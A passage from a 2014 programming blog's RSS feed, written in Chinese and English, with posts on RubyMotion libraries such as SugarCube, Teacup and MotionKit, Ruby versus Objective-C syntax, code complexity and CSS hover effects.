&lt;p&gt;重点考察候选人的口头表达能力。以及是否具备服从指挥，具有团队协作的性格。以及责任感。&lt;/p&gt;</description>
      <pubDate>Tue, 14 Oct 2014 00:53:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/questions-for-interview--2</link>
    </item>
    <item>
      <title>which to choose, rubymotion, swift or Object C?  </title>
      <description>&lt;p&gt;
refer to: &lt;a href="http://blog.motioninmotion.tv/is-rubymotion-suitable-for-client-work/"&gt;http://blog.motioninmotion.tv/is-rubymotion-suitable-for-client-work/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;In RubyWeekly I saw a link to a discussion on Reddit that was getting some good attention, and it was titled "Is RubyMotion suitable for Client Work?", and I imediately thought "Are people really still wondering if RubyMotion is production ready with apps like FrontBack and A Dark Room out there?".&lt;/p&gt;
&lt;p&gt;Opening up the thread through I was really happy to see this is someone considering a career in freelance iOS development, and is actually asking about how it might impact their income, a really good question, so I figured it was worth a really thought out answer. I took some time to think about my answer before I replied, and this is out it ended up.&lt;/p&gt;
&lt;p&gt;Their Question&lt;/p&gt;
&lt;p&gt;I have some Ruby background, and find working in text editors and from the command line far more enjoyable than IDEs.&lt;/p&gt;
&lt;p&gt;As such, I was strongly leaning toward Rubymotion to get into mobile development (and perhaps a bit of desktop OS X).&lt;/p&gt;
&lt;p&gt;But, I was recently cautioned that using a toolchain like Rubymotion would make it difficult for me to solicit client work.&lt;/p&gt;
&lt;p&gt;The argument went that most client work for independent freelancers like myself is going to be jobs outsourced by development companies or by the IT departments of the client companies themselves.&lt;/p&gt;
&lt;p&gt;In both cases, the use of "native" tools and processes is likely to be imposed, and the client will require source code at the end of the project, which they will not want to receive in Ruby.&lt;/p&gt;
&lt;p&gt;I was wondering if anyone else has experience in this area? Is Rubymotion suitable for freelance/contract work, or are the opportunities too few and far between to make for a viable career path?&lt;/p&gt;
&lt;p&gt;My Answer&lt;/p&gt;
&lt;p&gt;It seems you really want some advice from someone that has experienced a lot of sides of the field, so here's my thoughts, but let me prefix this with I did Objective-C before RubyMotion, I run the MotionInMotion RubyMotion screencast so I'm a little biased, but I've also got a Swift book on its way so I'm really not that biased. I've done consulting/contracting and freelance with both Objective-C and RubyMotion, and I'm working on apps with Swift at the moment (as well as with RubyMotion).&lt;/p&gt;
&lt;p&gt;Look at this decision purely from a fiscal and business sense. RubyMotion is a niche, but a niche with quickly growing popularity in the (funded) start up world. These people have the money to pay you and are often great to work with. There is plenty of work out there for a RubyMotion developer as long as they do what any freelancer has to do, network. Being in a niche will help you out here, because there is less noise to yell over.&lt;/p&gt;
&lt;p&gt;If you don't want to go niche though, focus on Objective-C and Swift, it will enable you to do work for larger IT companies as a consultant occasionally. It's good money, but honestly from experience it's not nearly as great as working with start ups using RubyMotion.&lt;/p&gt;
&lt;p&gt;My suggestion for you would be to learn RubyMotion if you already know Ruby, it will lessen the difficulty of learning Cocoa (OS X) and Cocoa Touch (iOS), and will also let you start playing with Android when you want to as well soon once it's out of beta, if you're not strong with Java.&lt;/p&gt;
&lt;p&gt;Still practice Objective-C and Swift though, especially in the early days you will be wanting to take any and all work that comes your way so that you can build your portfolio. The languages and the small style differences in how you use them are easy, it's the frameworks and the mindset that is much more difficult, you won't be an expert in that quickly, so start with RubyMotion and then learn some Objective-C and Swift and try recreating things from your RubyMotion projects in those.&lt;/p&gt;
&lt;p&gt;There is two reasons I say learn Objective-C, first is so you can understand all the code out there, second is that there will be projects that aren't new and are just needing updates. These will likely still be written in Objective-C.&lt;/p&gt;
&lt;p&gt;As a RubyMotion developer you can still use all the same tools that Swift and Objective-C developers use, including Xcode's Interface Builder and any of the open source Objective-C code out there like CocoaPods. This doesn't work in reverse though, a Swift or Objective-C developer coming to a RubyMotion project will have to get used to all the gems we use. There is much more value in an experienced RubyMotion dev for a RubyMotion project than there is an Objective-C or Swift dev, but there is almost the same value with any of the three working on an Objective-C or Swift app.&lt;/p&gt;
&lt;p&gt;With all that in mind, in my opinion learning RubyMotion seems like a fiscally sensible decision.&lt;/p&gt;</description>
      <pubDate>Wed, 08 Oct 2014 10:29:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/which-to-choose-rubymotion-swift-or-object-c</link>
    </item>
    <item>
      <title>rubymotion的坑：不稳定 ( is ruby motion still not so stable? ) </title>
      <description>&lt;p&gt;refer to:&amp;#160; &lt;a href="https://groups.google.com/forum/#!topic/rubymotion/x6-9c__IHH0"&gt;https://groups.google.com/forum/#!topic/rubymotion/x6-9c__IHH0&lt;/a&gt;, &lt;br /&gt;
and &lt;a href="http://www.mikekreuzer.com/2013/12/game-over-rubymotion.html"&gt;http://www.mikekreuzer.com/2013/12/game-over-rubymotion.html&lt;/a&gt;
&lt;br /&gt;
and &lt;a href="http://joshsymonds.com/blog/2013/06/26/why-im-not-using-rubymotion-in-production/"&gt;http://joshsymonds.com/blog/2013/06/26/why-im-not-using-rubymotion-in-production/&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;大概意思都是说rubymotion在生产环境中会有10%左右几率崩溃。从google讨论组中的情况看到BUG都修复好了。不知道现在如何了。持续观望。。。&lt;/p&gt;</description>
      <pubDate>Tue, 07 Oct 2014 13:56:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rubymotion-is-ruby-motion-still-not-so-stable</link>
    </item>
    <item>
      <title>ruby v.s. object-c  </title>
      <description>&lt;p&gt;refer to: &lt;a href="http://www.adamjonas.com/blog/objective-c-for-rubyists/"&gt;http://www.adamjonas.com/blog/objective-c-for-rubyists/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;看看代码就知道了：&lt;/p&gt;
&lt;pre&gt;# 为某个BUTTON设置文字：
# Object C： API:
- (void)setTitle:(NSString *)title forState:(UIControlState)state

# 实际用法：
[myButton setTitle:@"Clicked!" forState:UIControlStateHighlighted];

# 对比RUBY ：
@button.text='Clicked'
&lt;/pre&gt;
&lt;p&gt;对于 metaprogramming:&amp;#160;&lt;/p&gt;
&lt;pre&gt;# Object C: 
[world say:@"hello"];
[world performSelector:@selector(say:) withObject:@"hello"];
objc_sendMSG(id object, SEL selector)

# ruby:
world.send(:say, "hello")
&lt;/pre&gt;
&lt;p&gt;原文：&lt;/p&gt;
&lt;p&gt;So RubyMotion isn’t a superiority thing. I’d certainly prefer to be 100% fluent in objective-c from day one. Apple’s documentation appears to be pretty steller. The problem for me however, is that everything just looks so hard in obj-c. Method declarations are pretty intimidating. So here I go to look up how to set the title of a UIButton and I find &lt;code&gt;- (void)setTitle:(NSString *)title forState:(UIControlState)state&lt;/code&gt;. Now come on. That’s a little much to set a title of a button right? A guideline I have always tried to follow with my own code is to only create complicated methods for complicated tasks.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;This declaration is preceded by a minus (-) sign, which indicates that this is an instance method, as opposed to a class method. It requires an object to call it, and instance variables of the object are available to it inside its definition.&lt;/li&gt;
&lt;li&gt;The (void) indicates the return type. This method doesn’t return anything, so its result can’t be assigned to anything.&lt;/li&gt;
&lt;li&gt;This method name is &lt;code&gt;setTitle:forState:&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;The number of colons (:) indicate how many arguments it takes. T&lt;/li&gt;
&lt;li&gt;The first argument is the string to set the title to.&lt;/li&gt;
&lt;li&gt;The second argument is the button state (such as normal or pressed) in which to set the title.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Here’s an example of this method in use: &lt;code&gt;[myButton setTitle:@"Clicked!" forState:UIControlStateHighlighted];&lt;/code&gt;. So after you break it down things seems little more reasonable, but it feels like it shouldn’t be this hard.&lt;/p&gt;



&lt;p&gt;The specification of a class in Objective-C requires two distinct pieces: the interface and the implementation. The interface portion contains the class declaration and defines the instance variables and methods associated with the class. The interface is usually in a .h file. The implementation portion contains the actual code for the methods of the class. The implementation is usually in a .m file.&lt;/p&gt;</description>
      <pubDate>Tue, 07 Oct 2014 11:17:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruby-v-s-object-c</link>
    </item>
    <item>
      <title>开发rubymotion必备工具 —— 2 ( must-have libraries for rubymotion - part2) </title>
      <description>&lt;p&gt; refer to: &lt;a href="http://blog.arkency.com/2014/07/one-ruby-to-rule-them-all/"&gt;http://blog.arkency.com/2014/07/one-ruby-to-rule-them-all/&lt;/a&gt;
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Must-have-one&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://github.com/rubymotion/sugarcube"&gt;SugarCube&lt;/a&gt; - even better syntax for RubyMotion&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/rubymotion/BubbleWrap"&gt;BubbleWrap&lt;/a&gt; - a lot of utilities for managing most common platform elements like persistency, global state, notifications and hardware&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/usepropeller/afmotion"&gt;AFMotion&lt;/a&gt; - best networking library with beautiful DSL and block callbacks&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/rubymotion/motion-support"&gt;MotionSupport&lt;/a&gt; - port of the parts of ActiveSupport that make sense for RubyMotion
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Styling&lt;/strong&gt; (with emphasize on SweetKit)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://github.com/motion-kit/sweet-kit"&gt;SweetKit&lt;/a&gt; (&lt;a href="https://github.com/motion-kit/motion-kit"&gt;MotionKit&lt;/a&gt; + SugarCube) - layout and styling gem&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/colinta/sweettea"&gt;SweetTea&lt;/a&gt; (&lt;a href="https://github.com/colinta/teacup"&gt;Teacup&lt;/a&gt; + SugarCube) - CSS styling, it's seriously awesome, but not &lt;a href="https://github.com/motion-kit/motion-kit#goodbye-teacup"&gt;officially maintained yet&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Models&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://github.com/infinitered/cdq"&gt;Core Data Query&lt;/a&gt; -  manage your Core Data stack with data model file&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/sxross/MotionModel"&gt;Motion Model&lt;/a&gt; - DSL for Core Data with validation and mixins
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Frameworks&lt;/em&gt;
&lt;/strong&gt; (with preference to simpler for the beginning RMQ)&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/clearsightstudio/ProMotion"&gt;Promotion&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://github.com/infinitered/rmq"&gt;RMQ&lt;/a&gt; (which can use it's own styling mechanism)
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</description>
      <pubDate>Tue, 07 Oct 2014 10:33:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rubymotion-2-must-have-libraries-for-rubymotion-part2</link>
    </item>
    <item>
      <title>开发rubymotion必备工具 ( must-have libraries for rubymotion ) </title>
      <description>&lt;p&gt;refer to: &lt;a href="http://stackoverflow.com/questions/24333751/what-are-must-have-libraries-for-rubymotion"&gt;http://stackoverflow.com/questions/24333751/what-are-must-have-libraries-for-rubymotion&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Things most people use:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bubblewrap&lt;/li&gt;
&lt;li&gt;motion-cocoapods&lt;/li&gt;
&lt;li&gt;afmotion (if you need networking )&lt;/li&gt;
&lt;li&gt;motion-hockeyapp (or Testflight)&lt;/li&gt;
&lt;li&gt;awesome_print_motion&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From there, it depends. ProMotion is very popular, but some people want to be closer to the metal. My gem RMQ is popular, some people use it for everything (like we do) or just parts of it. Many people use ProMotion and RMQ together.&lt;/p&gt;

&lt;p&gt;A lot of people use Sugarcube. It pollutes a lot of classes, so if you like that it's awesome with tons of sugar, if you don't it probably isn't for you.&lt;/p&gt;

&lt;p&gt;Teacup is basically deprecated at this point. Use MotionKit or RMQ instead for stylesheets. I use RMQ of course, but MotionKit is really nice and I'd be totally happy using it as well. RMQ has grids, MotionKit has a very nice syntax and is less verbose. RMQ's stylesheets are more integrated with RMQ. MotionKit works in OS X and Android soon (RMQ is iOS only, although it should be portable to Android).&lt;/p&gt;

&lt;p&gt;If you use Core Data, I recommend CDQ, there really isn't any competition to it (my company makes CDQ, full disclosure).&lt;/p&gt;

&lt;p&gt;Normally people use a variety of CocoaPods, here a few common ones:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AFNetworking (this is the standard of course, and AFMotion uses this)&lt;/li&gt;
&lt;li&gt;SVProgressHUD&lt;/li&gt;
&lt;li&gt;JMImageCache&lt;/li&gt;
&lt;li&gt;etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I'd guess these are some common configurations:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Bubblewrap, RMQ&lt;/li&gt;
&lt;li&gt;Bubblewrap, Sugarcube, MotionKit&lt;/li&gt;
&lt;li&gt;Bubblewrap, ProMotion, Sugarcube, MotionKit&lt;/li&gt;
&lt;li&gt;Bubblewrap, ProMotion, RMQ&lt;/li&gt;
&lt;li&gt;Bubblewrap, ProMotion, Sugarcube, MotionKit, RMQ (used for events, animations, etc, not stylesheets)&lt;/li&gt;
&lt;/ul&gt;
</description>
      <pubDate>Tue, 07 Oct 2014 10:21:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rubymotion-must-have-libraries-for-rubymotion</link>
    </item>
    <item>
      <title>ProMotion 初体验 (first sight of ProMotion)</title>
      <description>&lt;p&gt;refer to: 
&lt;a href="https://github.com/clearsightstudio/ProMotion" style="background-color: transparent;"&gt;https://github.com/clearsightstudio/ProMotion&lt;/a&gt; and&amp;#160;
&lt;/p&gt;
&lt;p&gt;&lt;a href="http://confreaks.com/videos/3813-inspect-going-pro-with-promotion-from-prototype-to-production"&gt;http://confreaks.com/videos/3813-inspect-going-pro-with-promotion-from-prototype-to-production&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;一张图说话：&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/W1siZiIsIjIwMTQvMTAvMDcvMTBfMTdfNDNfNjk4X1NjcmVlbnNob3RfZnJvbV8yMDE0XzEwXzA3XzEwXzE1XzA2LnBuZyJdXQ/Screenshot%20from%202014-10-07%2010%3A15%3A06.png" title="Screenshot From 2014 10 07 10:15:06" alt="Screenshot From 2014 10 07 10:15:06" rel="225x255" width="1366.3999999761581" height="768.3999999761581" /&gt;&lt;/p&gt;
&lt;p&gt;再来张图：（我们要我们关心的，不要一些无用的莫名其妙的boiler plate代码）&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/W1siZiIsIjIwMTQvMTAvMDcvMTBfMjNfNThfMzg3X1NjcmVlbnNob3RfZnJvbV8yMDE0XzEwXzA3XzEwXzIyXzAzLnBuZyJdXQ/Screenshot%20from%202014-10-07%2010%3A22%3A03.png" title="Screenshot From 2014 10 07 10:22:03" alt="Screenshot From 2014 10 07 10:22:03" rel="225x255" width="1366.3999999761581" height="768.3999999761581" /&gt;&lt;/p&gt;
&lt;p&gt;再看看它的简洁和快速：&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/W1siZiIsIjIwMTQvMTAvMDcvMTZfNTlfMTZfODRfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMTBfMDdfMTZfNThfMTgucG5nIl1d/Screenshot%20from%202014-10-07%2016%3A58%3A18.png" title="Screenshot From 2014 10 07 16:58:18" alt="Screenshot From 2014 10 07 16:58:18" rel="225x255" width="1366.3999999761581" height="768.3999999761581" /&gt;&lt;/p&gt;</description>
      <pubDate>Tue, 07 Oct 2014 02:16:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/promotion-first-sight-of-promotion</link>
    </item>
    <item>
      <title>boilerplate code —— 不重要，但是又没它不行的代码</title>
      <description>&lt;p&gt;经常在英文材料中看到这个词。 dict.cn, iciba给出的意思都不准确，(样板文件，钢炉锅板）。 &amp;#160;估计“样板文件”略有其真实的意思。但实际上，我们可以翻译的再“通俗”一些。。。&lt;/p&gt;
&lt;p&gt;from wiki:&amp;#160;&lt;/p&gt;
&lt;p&gt;Boilerplate code&lt;br /&gt;From Wikipedia, the free encyclopedia&lt;br /&gt;In computer programming, boilerplate code or boilerplate is the sections of code that have to be included in many places with little or no alteration. It is often used when referring to languages that are considered verbose, i.e. the programmer must write a lot of code to do minimal jobs. The need for boilerplate can be reduced through high-level mechanisms such as metaprogramming (which has the computer automatically write the needed boilerplate text), convention over configuration (which provides good default values, reducing the need to specify program details in every project) and model-driven engineering (which uses models and model-to-code generators, eliminating the need for boilerplate manual code).&lt;/p&gt;
&lt;p&gt;不重要，但是没它不行。用来跟verbose同义。 可以通过 metaprogramming, convention over configuration, 以及 mode-driven engineering 来改善。&lt;/p&gt;
&lt;p&gt;可以通过 convention over configuration 来改善的例子，就是 struts, spring 中我们深恶痛绝的 xml 文件，都可以在 rails 中被COC干掉。&lt;/p&gt;</description>
      <pubDate>Tue, 07 Oct 2014 01:59:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/boilerplate-code</link>
    </item>
    <item>
      <title>编程的核心之一：控制 复杂度（controlling the complexity is the essense of programming) </title>
      <description>&lt;p&gt;原来 Brain Kernighan早就说过了这句话。 ( 大名鼎鼎的C 语言编程的作者）&lt;/p&gt;
&lt;p&gt;可惜很多写了多年 代码的同学还不懂。见过上万行的class, 上千行的method. 上千行的html. &amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/W1siZiIsIjIwMTQvMTAvMDcvMDlfNDhfMzVfNTg3X1NjcmVlbnNob3RfZnJvbV8yMDE0XzEwXzA3XzA5XzQxXzEwLnBuZyJdXQ/Screenshot%20from%202014-10-07%2009%3A41%3A10.png" title="Screenshot From 2014 10 07 09:41:10" alt="Screenshot From 2014 10 07 09:41:10" rel="225x255" width="1366.3999999761581" height="768.3999999761581" /&gt;&lt;/p&gt;
&lt;p&gt;其实遵循几个简单的原则来编程就可以：&lt;/p&gt;
&lt;p&gt;1. 方法，类都不能过长。 方法原则 上不要超过20行。 类不要过大。控制在500行以内吧。&lt;/p&gt;
&lt;p&gt;2. 重构的两个重要手段：1. rename, 2. extract method&lt;/p&gt;
&lt;p&gt;3. 最好的注释就是 易懂的方法名。 wox8y 谁也不知道是啥意思，但是 give_me_coffee() 就可读性特别强。&lt;/p&gt;</description>
      <pubDate>Tue, 07 Oct 2014 01:41:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/controlling-the-complexity-is-the-essense-of-programming</link>
    </item>
    <item>
      <title>使用MotionKit for your Layout &amp; styling </title>
      <description>&lt;p&gt;refer to: &lt;a href="https://github.com/motion-kit/motion-kit"&gt;https://github.com/motion-kit/motion-kit&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;内容很多。&lt;/p&gt;
&lt;p&gt;The RubyMotion layout and styling gem. &amp;#160; 最好的地方就是可以跟其他框架集成。 &amp;#160;比如RMQ。&lt;/p&gt;
&lt;p&gt;Crossplatform compatibility: iOS, OSX, and planned support for Android&lt;br /&gt;Simple, easy to learn DSL&lt;br /&gt;Crossframework compatibility:&lt;br /&gt;UIKit&lt;br /&gt;AppKit&lt;br /&gt;AutoLayout&lt;br /&gt;Frame geometry&lt;br /&gt;CoreAnimation&lt;br /&gt;NSMenu/NSMenuItem&lt;br /&gt;Easily extendable to support custom, mini-DSLs&lt;br /&gt;Non-polluting&lt;br /&gt;ProMotion/RMQ/SugarCube-compatible (kind of goes hand-in-hand with being non-polluting)&lt;br /&gt;Styles and layouts are "just code" (not hash-based like in Teacup)&lt;br /&gt;Written by the authors of ProMotion and Teacup&lt;/p&gt;</description>
      <pubDate>Tue, 07 Oct 2014 00:20:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/motionkit-for-your-layout-styling</link>
    </item>
    <item>
      <title>使用sweetkit + motionkit 使代码可读性更强，更简介（use sweetkit instead of sweettea)</title>
      <description>&lt;p&gt;refer to: &lt;a href="https://github.com/motion-kit/sweet-kit"&gt;https://github.com/motion-kit/sweet-kit&lt;/a&gt;, &lt;/p&gt;
&lt;p&gt;前篇文章，向大家介绍了 sweettea 。 虽然它已经停止了，但是原作者写出了新工具：sweetkit 。 让我们看一看：&lt;/p&gt;
&lt;p&gt;官方介绍就一句话：Some helpers for MotionKit that add the coercion abilities of SugarCube to the style abilities of MotionKit, for great good.&lt;/p&gt;
&lt;p&gt;于是我提了个issue: 要多几个例子。对方1分钟就回复我了：&lt;/p&gt;
&lt;pre&gt;You should read up on MotionKit, there are lots of samples and documentation.  SweetKit is just some helpers for MotionKit:
&lt;/pre&gt;
&lt;p&gt;&lt;img src="/system/images/W1siZiIsIjIwMTQvMTAvMDcvMDhfMjdfMjlfMTM0X1NjcmVlbnNob3RfZnJvbV8yMDE0XzEwXzA3XzA4XzI0XzUyLnBuZyJdXQ/Screenshot%20from%202014-10-07%2008%3A24%3A52.png" title="Screenshot From 2014 10 07 08:24:52" alt="Screenshot From 2014 10 07 08:24:52" rel="225x255" width="1366.3999999761581" height="768.3999999761581" /&gt;&lt;/p&gt;
</description>
      <pubDate>Mon, 06 Oct 2014 23:49:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/sweetkit-motionkit-use-sweetkit-instead-of-sweettea</link>
    </item>
    <item>
      <title>继续发挥ios的可读性：teacup ( ios readability: teacup ) 尽管它已经过时</title>
      <description>&lt;p&gt;refer to:&amp;#160; &lt;a href="https://github.com/colinta/teacup"&gt;https://github.com/colinta/teacup&lt;/a&gt;, &amp;#160;
&lt;a href="https://github.com/colinta/sweettea"&gt;https://github.com/colinta/sweettea&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;上篇说道了 sugarcup, &amp;#160;这次说说teacup. 尽管官方文档说它已经过时了，后继者是 MotionKit&lt;/p&gt;
&lt;p&gt;它的目的是 抛弃 Xcode 和 XIB 文件。 （广大人民群众喜闻乐见的对某种技术的深恶痛绝） ^_^ &amp;#160;它是一种专门针对IOS开发的视图层(view layer) 的DSL（领域专用语言）. Teacup由两部分组成：&lt;/p&gt;
&lt;p&gt;1. 专门描述视图结构 —— 类似于 html&lt;/p&gt;
&lt;p&gt;2. 专门描述视图的样式 &amp;#160; —— 类似于 css&lt;/p&gt;
&lt;p&gt;例如；&lt;/p&gt;
&lt;pre&gt;# 视图,  view layer:
class MyController &amp;lt; TeacupWindowController
  stylesheet :main_window

  def teacup_layout
    subview(NSButton, :hi_button)
  end
end

# 样式： style
Teacup::Stylesheet.new :main_window do
  style :hi_button,
    origin: [10, 10],
    title: 'Hi!'
end 
&lt;/pre&gt;
&lt;p&gt;而 Sweettea (teacup + sugarcube = sweettea ) 把这种可读性提高到了一个新的高度（编程的终极目标，是让代码达到自然语言的高度）&lt;/p&gt;
&lt;p&gt;例如：（对比一下第一个和第三个，是不是让人心潮澎湃？ 你敢想象 第三个跟 raw object c 的对比吗？）&lt;/p&gt;
&lt;pre&gt;# what was
my_image = UIImage.imageNamed("Logo")
style :label,
  font: UIFont.fontWithName("Inconsolata", size:UIFont.systemFontSize),
  image: my_image,
  origin: [10, 10],
  size: my_image.size

# sugarcube
my_image = "Logo".uiimage
style :label,
  font: "Inconsolata".uifont,
  image: my_image,
  origin: [10, 10],
  size: my_image.size

# sweettea
style :label,
  font: "Inconsolata",
  image: "Logo",
  origin: [10, 10]
&lt;/pre&gt;

&lt;p&gt;不过，该插件目前已经停止更新，原作者建议 使用 MotionKit 来代替 Teacup (同时，使用 sweetkit 代替 sweettea )&amp;#160;&lt;/p&gt;
&lt;p&gt;原文如下：（信中阐述了为何作者会停更 teacu, sweettea的原因，以及 motionkit的出现，以及其他框架/工具的特点 )&lt;/p&gt;
&lt;p&gt;by colinta&lt;/p&gt;
&lt;p&gt;If you've worked with XIB/NIB files, you might know that while they can be cumbersome to deal with, they have the great benefit of keeping your controllers free of layout and styling concerns. Teacup brought some of this benefit, in the form of stylesheets, but you still built the layout in the body of your controller file. This needed to be fixed.&lt;/p&gt;
&lt;p&gt;如果你用过XIB/NIB，那么你一定会觉得它们烦透了，虽然它们可以为你的页面布局带来巨大的好处。而Teacup通过使用stylesheet的形式保留了这些好处，不过仍然是把layout代码留在了controller中。这样不合适。&lt;/p&gt;
&lt;p&gt;Plus Teacup is a beast! Imported stylesheets, orientation change events, auto-layout support. It's got a ton of features, but with that comes a lot of complexity. This has led to an unfortunate situation - I'm the only person who understands the code base! This was never the intention of Teacup. It started out as, and was always meant to be, a community project, with contributions coming from all of its users.&lt;/p&gt;
&lt;p&gt;另外，Teacup也很难驾驭。导入了stylesheets, orientation change &amp;#160;events, auto-layout ... 虽然有很多特性，但是也同时带来更多的复杂性。于是我面临这样的境地：底层代码只有我一个人看的懂！这根本不是Teacup项目的本意。它产生时就是一个社区性的项目，希望大家都能提交代码～&lt;/p&gt;
&lt;p&gt;When ProMotion and later RMQ were released, they both included their own styling mechanisms. Including Teacup as a dependency would have placed a huge burden on their users, and they would have had to ensure compatibility. Since Teacup does a lot of method swizzling on base classes, this is not a trivial undertaking.&lt;/p&gt;
&lt;p&gt;当 ProMotion 和 RMQ相继出现后，它们都带来了自身的 styling 工具。如果在这两种项目中再使用Teacup，会为用户带来不小的麻烦和复杂度，因为Teacup对底层的基础类做了很多修改。&lt;/p&gt;
&lt;p&gt;If you use RMQ or ProMotion already, you'll find that MotionKit fits right in. We designed it to be something that can easily be brought into an existing project, too; it does not extend any base classes, so it's completely opt-in.&lt;/p&gt;
&lt;p&gt;如果你正在使用RMQ 或者ProMotion, MotionKit比较适合你。我们设计MotionKit的目的就是为了让它能够简单轻松的在既有项目中被使用，它没有改动过任何底层的基础类。所以不必担心任何兼容性的问题。&lt;/p&gt;
&lt;p&gt;Unlike Teacup, you won't have your styles reapplied due to orientation changes, but it's really easy to set that up, as you'll see. Or, use AutoLayout (the DSL is better than Teacup's, I think) and you'll get orientation changes for free!&lt;/p&gt;
&lt;p&gt;与Teacup不同的是，你不必为你的orientation 改动而 reapply styles, 所以特别简单。或者使用AutoLayout 也行，它的DSL比Teacup的要好。 &amp;#160;&lt;/p&gt;
&lt;p&gt;Big thanks to everyone who contributed on this project! I hope it serves you as well as Teacup, and for even longer into the future.&lt;/p&gt;
&lt;p&gt;感谢所有为本项目(MotionKit) 提供过支持的人！我希望MotionKit能向Teacup一样，很好的为你服务，而且能服务很长时间。&lt;/p&gt;
&lt;p&gt;Sincerely,&lt;/p&gt;
&lt;p&gt;Colin T.A. Gray Feb 13, 2014&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sun, 05 Oct 2014 23:44:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ios-teacup-ios-readability-teacup</link>
    </item>
    <item>
      <title>把ios的可读性发挥到极致 —— rubymotion- sugarcube</title>
      <description>&lt;p&gt; refer to: &lt;a href="https://github.com/rubymotion/sugarcube"&gt;https://github.com/rubymotion/sugarcube&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;ruby 这个语言就是把可读性发挥到了极致。&amp;#160;&lt;/p&gt;
&lt;p&gt;而 有追求的程序员都是追求极致的，所以又有了 &amp;#160;active-support.&amp;#160;&lt;/p&gt;
&lt;p&gt;在 rubymotion中，大家延续了这样的风格： &amp;#160;sugarcube.&amp;#160;&lt;/p&gt;
&lt;pre&gt;# 原始代码：
UIApplication.sharedApplication.openURL(NSURL.URLWithString(url))
# with sugarcube: 
url.nsurl.open
&lt;/pre&gt;
&lt;p&gt;借用一段 官方文档的例子：&lt;/p&gt;
&lt;pre&gt;require 'sugarcube-animations'

# Careful, once you start using these helpers, you'll never go back.
# 是不是想起了 jquery v.s. raw js,  coffeescript v.s. raw js,  rails v.s. struts ? 

view.move_to [100.0, 100.0] # origin
view.center_to [100.0, 100.0] # center
view.scale_to 2  # double the size, and preserves existing rotation transform
# view.scale_to 4 -&amp;gt; CGAffineTransformMakeScale(4, 4)
# view.scale_to [4, 3] -&amp;gt; CGAffineTransformMakeScale(4, 3)
view.fade_out
view.slide :left, 100
&lt;/pre&gt;</description>
      <pubDate>Sun, 05 Oct 2014 23:34:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ios-rubymotion-sugarcube</link>
    </item>
    <item>
      <title>非常不错的纯CSS菜单效果( css menu effects  )</title>
      <description>&lt;p&gt;github: &lt;a href="http://ianlunn.github.io/Hover/"&gt;http://ianlunn.github.io/Hover/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;watch: 4781&amp;#160;&lt;/p&gt;
&lt;p&gt;用法非常简单：&lt;/p&gt;
&lt;p&gt;1. 下载 &lt;a href="http://ianlunn.github.io/Hover/css/hover.css"&gt;http://ianlunn.github.io/Hover/css/hover.css&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;2. 找到对应的效果（例如 grow) ，然后复制过来：&lt;/p&gt;
&lt;pre&gt;/* Grow */

.grow {
  display: inline-block;
  -webkit-transition-duration: 0.3s;
  transition-duration: 0.3s;
  -webkit-transition-property: -webkit-transform;
  transition-property: transform;
  -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
  -webkit-transform: translateZ(0);
  -ms-transform: translateZ(0);
  transform: translateZ(0);
  box-shadow: 0 0 1px rgba(0, 0, 0, 0);
}

.grow:hover {
  -webkit-transform: scale(1.1);
  -ms-transform: scale(1.1);
